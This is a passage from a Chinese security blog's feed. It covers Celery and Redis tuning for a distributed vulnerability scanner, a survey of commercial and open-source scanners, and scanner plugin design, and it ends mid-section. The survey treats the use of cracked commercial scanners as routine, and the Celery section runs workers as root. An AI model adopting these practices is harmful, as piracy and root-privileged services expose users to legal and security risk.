&lt;p&gt;我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$value = apply_filters( &quot;pre_update_option_{$option}&quot;, $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb-&amp;gt;update( $wpdb-&amp;gt;options, $update_args, array( 'option_name' =&amp;gt; $option ) );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;附上数据库wp_options表查询的最初始的默认结果：
&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;本文可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。&lt;/p&gt;

&lt;p&gt;引用文章：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/&quot;&gt;Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</summary></entry><entry><title type="html">分布式扫描填坑杂谈</title><link href="/scanner/2019/01/15/talk-about-scanner-settings/" rel="alternate" type="text/html" title="分布式扫描填坑杂谈" /><published>2019-01-15T15:49:21+08:00</published><updated>2019-01-15T15:49:21+08:00</updated><id>/scanner/2019/01/15/talk-about-scanner-settings</id><content type="html" xml:base="/scanner/2019/01/15/talk-about-scanner-settings/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，将简单谈谈我这边采用的技术栈，有关对分布式填坑的经历，大家注意这里依旧是采用的python code。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以root权限启动root的问题，低版本不识别，会报错，这里使用的是celery==3.1.2x。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from celery import Celery, platforms
platforms.C_FORCE_ROOT = True

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;redis库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;版本不合适，或者worker和server版本不对等的话，可能出现celery worker 开启不久就offline的问题，或者redis会不时的掉线重连。&lt;/p&gt;

&lt;p&gt;这里把redis库的版本，从原来的redis==3.0.x降级到redis==2.10.x，基本解决了上述bug。&lt;/p&gt;

&lt;p&gt;需要注意的是，在celery高版本的时候（比如4.x），可能会需要匹配3.x的redis库，大家看情况而定。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;重连机制&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们这里在后端存储结果，考虑到复杂sql交叉调用，还是采用的关系数据库mysql。&lt;/p&gt;

&lt;p&gt;局域网中数据库写入，需要考虑重连机制，常用的如MySQLdb库，原生无重连机制，需要自己重写。&lt;/p&gt;

&lt;p&gt;这里推荐两个模块，都支持重连：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;torndb
facebook开源的一个基于MySQLdb二次封装的一个mysql模块。
pymysql
比较常用，需要python3。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;加强存取稳定性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要加强局域网数据存取的稳定性，除了把上述的超时和重连配置好以外，暂时有两个办法：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;第一：可以将存入局域网数据库服务器失败的数据，暂存本地关系数据库。采用定时调度器，或者监控网络空闲时，再进行同步
。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;第二：可以将命令或者数据直接写入本地中间件，当监控到网络空闲时间，自动同步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;另外，笔者这方面经验比较浅，欢迎运维大佬和coding大佬多多指教下这一块儿有没有其他可优化的点。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;局域网调试&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测网络状态，可以看出ping其他worker是通的：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; app = Celery('test', backend='redis://random_host:6379/0', broker='redis://random_host:6379/0')
&amp;gt;&amp;gt;&amp;gt; app.control.ping(timeout=0.5)

[{'worker1.example.com': 'pong'},
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;查看时区差异:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from celery.utils.timeutils import utcoffset
&amp;gt;&amp;gt;&amp;gt; utcoffset()

0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;库版本不同步等原因，可能造成worker和server的时间不同步。而且时间不同步，似乎会导致celery的超时机制不可用。&lt;/p&gt;

&lt;p&gt;我们可以安装ntp服务，自动更新时间，同步server和worker的指定python库版本，示例命令如下【每个系统情况不一定适用】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install ntp
service ntp start
#手动更新时间
date -R

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;监控woker状态的一些点，可以参考这篇文章：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://fangchichen.github.io/fangchichen.github.io/2018/08/08/celery%E5%87%BA%E7%8E%B0worker%E5%BC%82%E5%B8%B8offline%E6%83%85%E5%86%B5/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery关键配置&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还是那句话，各系统情况不同，
这里仅仅贴出几个关键点,大家觉得可以优化的地方可以讨论下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#任务预取功能，就是每个工作的进程／线程在获取任务的时候，会尽量多拿 n 个，以保证获取的通讯成本可以压缩。
CELERYD_PREFETCH_MULTIPLIER = 1

#这个表示每个工作的进程／线程 在执行 n 次任务后，主动销毁，之后会起一个新的，主要解决一些资源释放的问题。
CELERYD_MAX_TASKS_PER_CHILD = 1

#不存取返回结果，加快响应速度。
CELERY_IGNORE_RESULT=False

#该配置可以保证task不丢失，中断的task在下次启动时将会重新执行。
TASK_REJECT_ON_WORKER_LOST = True
#不会多拿任务，只有当worker完成了这个task时，任务才被标记为ack状态。
#只有当worker完成了这个task时，任务才被标记为ack状态
CELERY_ACKS_LATE = True

#解决时区同步问题
CELERY_TIMEZONE = 'Asia/Shanghai'
CELERY_ENABLE_UTC = True
USE_TZ = True

#broker的连接超时时间。
BROKER_CONNECTION_TIMEOUT = 20

#如果确认是因为当前worker的并发是prefork（多进程）,并且可能是由于死锁原因造成，4.0之后的版本不支持。
CELERYD_FORCE = True

#任务超时会分配给其他worker
BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 3600}

#禁用所有速度限制，如果网络资源有限，不建议开足马力。
#CELERY_DISABLE_RATE_LIMITS = True
#CELERY_ACKS_LATE = True
#CELERY_IGNORE_RESULT = True

#这个表示保存任务结果的时长，这个时间会被设置到 backend 里面
#CELERY_TASK_RESULT_EXPIRES = 3600

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery命令行参数&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Queue还是建议启用的，方便清空，也方便指定queuename运行特定任务。
比如配置文件里这么写:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CELERY_QUEUES = (
            Queue('default', Exchange('default'), routing_key='default'),
            Queue('wakaka', Exchange('wakaka'), routing_key='wakaka'),
            )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;那么，命令行可以这么输入：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;celery -A test worker -E -l INFO -n workername -Q wakaka --concurrency=4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意，–concurrency的值是并发进程数，这是由你的CPU个数决定性能的，不要设太高。&lt;/p&gt;

&lt;p&gt;win下的话，在高版本celery 4.x，默认的是prefork，报错解决方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install eventlet
celery -A proj worker -l info -P eventlet

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后，建议大家不要在win下运行celery，似乎4.x以后某个版本已经放弃支持，而且win下有很多坑没法填。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;任务调度框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于任务调度这一块儿，除了celery，感觉dramatiq和rq的坑会少些，以后会抽空来谈谈。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</summary></entry><entry><title type="html">漫谈漏洞扫描</title><link href="/scanner/2018/12/27/talk-about-scanner-roads/" rel="alternate" type="text/html" title="漫谈漏洞扫描" /><published>2018-12-27T16:42:38+08:00</published><updated>2018-12-27T16:42:38+08:00</updated><id>/scanner/2018/12/27/talk-about-scanner-roads</id><content type="html" xml:base="/scanner/2018/12/27/talk-about-scanner-roads/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;企业级漏扫&quot;&gt;企业级漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;盒子扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于漏扫产品的话，部分甲方单位会按公安那边的标准，在内网部署一些盒子扫描器（硬件服务器+扫描软件）。&lt;/p&gt;

&lt;p&gt;说实话，这玩意儿定位是比较尴尬的，虽然大的单位每年有一定的采购指标。但是有时候还是会听产品经理吐槽，每次实在卖不出量，可能一单安全服务生意卖出个一两台就不错了。&lt;/p&gt;

&lt;p&gt;当然，现在漏扫一般会配合漏洞管理、网站监控等产品一起卖。为了覆（tong）盖（hang）产（jing）品（zheng）线，给售前和销售操控的空间，这款产品还是必须要的。&lt;/p&gt;

&lt;p&gt;卖漏扫盒子的利润还算可观，只要销售和渠道给力，传统乙方还是愿意做的这门生意的。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sangfor
venus
nsfocus
topsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;在线漏扫服务&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在线漏扫的话，一般难以对内网进行检测。大多数的操作是，在验证外网某站的所有权后，再签协议授权扫描。不过由于成本较盒子更加低廉，容易受到中小厂商的追捧。&lt;/p&gt;

&lt;p&gt;当然，如果内网也需要享受这样的服务的话，自然还是需要安服人员带着盒子，或者类似封装好的扫描器，在企业单位进行驻场检测。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;360
knownsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;定制漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;据笔者所知，部分云服务厂商，会对云服务客户提供了定制漏扫服务。&lt;/p&gt;

&lt;p&gt;由于是自家的服务器，自然对客户的业务具有一定的了解。无论是做漏扫，还是做资产监控还是态势感知，都是相对容易的。&lt;/p&gt;

&lt;p&gt;云服务厂商在对这部分客户做漏扫时，由于统一的架构部署，安服漏扫会比较精确和有效。貌似这样的漏扫服务，一般不会对外开放，算是定制的服务。&lt;/p&gt;

&lt;p&gt;顺便提一句，部分漏洞平台，好像对于大客户也推出了一条龙服务，其中是包括定制漏扫的。&lt;/p&gt;

&lt;p&gt;代表云厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alibaba
tencent
kingsoft
riskivy
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;免费商业漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;市面上也出现了部分优秀的商业级别漏扫，咱们这里先别讨论是免费版还是破解版。&lt;/p&gt;

&lt;p&gt;正是有了这些漏扫产品，在驻场和分公司的苦逼兼职的安服人员，才有了一口饭吃【纯吐槽公司制度】。&lt;/p&gt;

&lt;p&gt;这里解释下，因为公司内部的漏扫产品，不是分驻地都能拿到授权的，那最后怎么办呢？用破解的。效果不好咋办？换其他家的破解或者免费产品。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AWVS
nessus
arachni
metasploit
sqlmap
burpsuite
appscan
netsparker
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开源漏扫&quot;&gt;开源漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;社区级漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些产品一般是社区或者团队在维护的，一般为乙方渗透人员或者Bug Bounty人员所用。&lt;/p&gt;

&lt;p&gt;一旦他们需要对企业机构，或者政府单位进行渗透测试时，可以根据情况，部署分布式节点扫描，加快漏扫速度。&lt;/p&gt;

&lt;p&gt;笔者依稀记得曾经的bugscan，好像大家都可以接入公网节点。这听起来，其实有点像以前的迅雷p2p，可以加速所有运行的任务。&lt;/p&gt;

&lt;p&gt;不过后来好像由于各种原因，部分人搞到了源码和payload包，自己玩起了单机。多台外网VPS一部署，扫起东西来也是美滋滋，亲测出结果还是比较快的。&lt;/p&gt;

&lt;p&gt;不过这种漏扫有个坏处就是，一旦社区不用心再维护，渐渐就没有人再提交payload，毕竟单个漏洞的生命周期还是不长的。&lt;/p&gt;

&lt;p&gt;当然，这种产品还有个去路，就是实现企业化。&lt;/p&gt;

&lt;p&gt;一旦变成企业级产品，就会有更多的资源投入去维护它，自然能更好的发展下去。&lt;/p&gt;

&lt;p&gt;比较可惜的是，升级后的版本以及payload，自然大多数就不会再开源了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bugscan
蚁逅
tangscan
Beebeeto
Pocscan
Osprey「鱼鹰」
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;综合扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于各种脚本语言的兴起，大幅减少了coding的难度和时间，网络上涌现出一批由团队或个人维护的综合扫描器。&lt;/p&gt;

&lt;p&gt;虽然得吐槽下，大多数质量良莠不齐，造轮子的比较多，而且后续长期作者维护的比较少，不过其中不乏优秀的个体。&lt;/p&gt;

&lt;p&gt;综合扫描定义比较模糊，一般除了exp检测和CMS识别外，还有部分项目加入了路径爆破、资产统计、端口扫描等功能。&lt;/p&gt;

&lt;p&gt;不过让人稍稍有点失望的是，这类综合扫描可能大同小异，暂时没有发现特别亮眼的点。&lt;/p&gt;

&lt;p&gt;在笔者过往的系列文章中，也谈过部分关于综合扫描器细节，这里不再细说。&lt;/p&gt;

&lt;p&gt;代表产品有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;w9scan
AngelSword
fenghuangscanner
猪猪侠PPT中提过的扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Gui扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里之所以单独区别于前面的综合扫描器【其实是笔者实在想不出小标题了XD】，是想谈谈其开发时间、开发难度，以及插件化难度。&lt;/p&gt;

&lt;p&gt;虽然说部分Gui扫描器也实现了插件化，但作者们大多喜欢自己更新，或者只要求邮件方式提交插件。&lt;/p&gt;

&lt;p&gt;这样的话，把产品生态搞成了一个近似闭环，但是肯定又远不及apple store之类的体量，导致用户主动提交的漏扫插件是比较少的。&lt;/p&gt;

&lt;p&gt;当然，有部分漏扫的功能和用户体验，还是做的很不错的，很受大家追捧，笔者当年也用的很顺手。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;椰树
北极熊扫描器
k8 team系列扫描器
千手千眼佛网站扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;代理扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说起代理扫描器，可能内容就比较宽泛了，这里简单讲下，以后有机会单独谈谈。&lt;/p&gt;

&lt;p&gt;何谓代理，中间人也，只要你能抓住中间流量，便可以作为基准去做漏洞扫描或者fuzz。&lt;/p&gt;

&lt;p&gt;大家可能会想到利用抓包，利用网卡流量进行分析；有人也许会通过浏览器流量代理进行分析；还有人会通过浏览器本身提供扩展插件功能，直接对页面进行即时钩子探测。&lt;/p&gt;

&lt;p&gt;说到这块儿，笔者所见的一般都是轻量级的，也可能是见识少吧。个人感觉很少有在采集存数据库以后，在离线端部署过多的exp探测任务的。&lt;/p&gt;

&lt;p&gt;毕竟，这块儿也是要考虑到扫描效率，以及会话过期问题的。&lt;/p&gt;

&lt;p&gt;另外，貌似代理扫描器对owasp的一些通用漏洞的fuzz，以及对敏感内容的检测，会显得多一些。对于能检测逻辑漏洞的被动扫描器，也算是比较高level的了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysrc的GourdScan
burpsuite插件系列
wyproxy的衍生扫描器
浏览器插件系列
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。&lt;/p&gt;

&lt;p&gt;可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</summary></entry><entry><title type="html">浅谈漏扫之插件篇</title><link href="/scanner/2018/10/08/scanner-plugins/" rel="alternate" type="text/html" title="浅谈漏扫之插件篇" /><published>2018-10-08T12:37:38+08:00</published><updated>2018-10-08T12:37:38+08:00</updated><id>/scanner/2018/10/08/scanner-plugins</id><content type="html" xml:base="/scanner/2018/10/08/scanner-plugins/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，我们将简单谈谈插件相关的内容。下面的示例代码依旧沿用python，但求行文精炼不赘言。&lt;/p&gt;

&lt;h3 id=&quot;插件的格式&quot;&gt;插件的格式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;入口函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def run():
    print 'I am the bone of my sword'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;运行这类插件时，加载插件的入口函数run，就可以直接运行插件。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;类 + 入口函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BaseVerify:

    def __init__(self, url):
        self.url = url
    
    def run(self):
        print 'I am the bone of my sword'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;对于这种插件，在我们获取到漏洞库文件路径后，需要对服务类型进行匹配，最后再进行插件调用。
此后，我们会获得BaseVerify类的实例，再引用里面的入口函数。&lt;/p&gt;

&lt;p&gt;调用方式：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;test = BaseVerify('http://www.baidu.com')
test.run()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;入口函数 + 验证函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def assign(service, arg):
    if service != &quot;wordpress&quot;:
        return
    else:
        r = urlparse.urlparse(arg)
        return True, r.netloc
        
def audit(arg):
    print 'I am the bone of my sword'
        
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里也可以在类中引入函数，不过此处关键点在于，同时也使用了验证函数。&lt;/p&gt;

&lt;p&gt;这样做的好处在于，即使不做插件目录分类，也能进行精准扫描，不至于在验证漏洞时处耗时过多。&lt;/p&gt;

&lt;p&gt;不过顺便提一句，即使只运行了验证service类型的代码，在加载大量插件的情况下，也是会消耗一定的资源的。&lt;/p&gt;

&lt;p&gt;调用方式(仅做参考)：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;try:
    audit( assign('www', 'http://www.baidu.com')[1] )
except:
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;关于插件注释&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在每个文件中，建议通过类属性或者直接头部注释，对每个插件进行细节标识。
不然的话，他人在复现和修改的时候，很难对代码量较大的内容进行阅读调整。当然，对于某些故意加密的插件，那就另当别论了。&lt;/p&gt;

&lt;h3 id=&quot;插件的加载&quot;&gt;插件的加载&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;__import__&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;plugin_path = 'plugin_dir.plugin_name'
try:
    plugin = __import__(plugin_path, fromlist=[plugin_path])
    test = getattr(plugin,'audit')
    test('http://www.baidu.com')
except Exception,e:
    print e

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里在获取某个插件的路径后，可转换为__import__可识别的路径格式，然后再对其入口函数audit进行引用。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;importlib&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
from importlib import import_module
plugin_path = 'plugin_dir.plugin_name'
split_dot = plugin_path.rindex('.')
module, name = plugin_path[:split_dot], plugin_path[split_dot+1:]
mod = import_module(module)
try:
    test = getattr(mod, name)
    test.audit('http://www.baidu.com')
except:
    pass

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;注意，这里的plugin_path如果不含’.’的话，可用：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from importlib import import_module
plugin_path = 'plugin_name'
test = import_module(plugin_path)
test.audit('http://www.baidu.com')

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;import&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
sys.path.append('plugin_dir/')
#加入系统路径plugin_dir
import plugin_name
plugin_name.audit('http://www.baidu.com')
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;imp&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import imp
#这里需要正常路径名
test = imp.load_source('audit', 'plugin_dir/plugin_name.py')
test.audit('http://www.baidu.com')

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;导入细节的讨论&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;笔者还见过某框架，除了导入必要的核心库文件以外，还把所有分类插件里的验证、运行等函数，也在主文件头部一股脑导入的。&lt;/p&gt;

&lt;p&gt;也就是说，在每次运行框架之前，就算只是-v看版本，也会预载入所有内容。&lt;/p&gt;

&lt;p&gt;而在某些框架脚本，在每次运行前会自动下载一个巨大的封装库（作者diy的），而不是把它放在requirement文件里。&lt;/p&gt;

&lt;p&gt;也不是说这样一定不好，不过个人窃以为，如果想要尽可能优化框架的效率，还是不太推荐大家这么做。&lt;/p&gt;

&lt;h3 id=&quot;插件的存储&quot;&gt;插件的存储&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;临时加载&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在插件不算多的时候，我们是可以这么做的，也不会太影响效率。
比如metasploit就可以选择是否启用postgresql数据库。
如果插件都放在一个目录下，进行文件遍历即可，大概可以这样写：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln_dir = 'plugin_dir/*'
vuln_paths = [f.replace('/','.') for f in glob.glob(vuln_dir)]
for vuln_path in vuln_paths:
    #vuln_path == 'plugin_dir.plugin_name'
    #下面省略
    ...
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;离线插件入库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外还有不少框架，是直接用数据库或者json文件存储了插件相关信息。在我们需要的时候，再查询导入储存的插件路径，进而对相应的插件进行调用。&lt;/p&gt;

&lt;p&gt;当然，这样需要我们每次手动或调用update脚本，去现更新这些库。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在线核验下发&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要再自动化一点，我们可以参考下bugscan、antoor、tangscan等社区级别的漏洞利用框架，对于插件下发的法子。&lt;/p&gt;

&lt;p&gt;在贡献者上传poc，并填写好相关验证信息后，后台会有工作人员或者自动化脚本，检测该poc是否合乎官方规定的语法格式。
如果没有发现问题，脚本会生成基础信息然后入库，待做好加密打码等工作后【非必要步骤】，再供离线的框架或者框架client节点爬取更新【如有出入，当我扯淡】。&lt;/p&gt;

&lt;h3 id=&quot;结果的聚合&quot;&gt;结果的聚合&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;分级过滤&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一般在汇总数据报告时，可能会出现有的确认是漏洞，有的却是存在的敏感URL。&lt;/p&gt;

&lt;p&gt;混在一起存储也不是不行，不过更好的法子是通过分级，使用单独的函数上报master，最后再进行分储和输出。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;混合存储&lt;/li&gt;
&lt;/ul&gt;

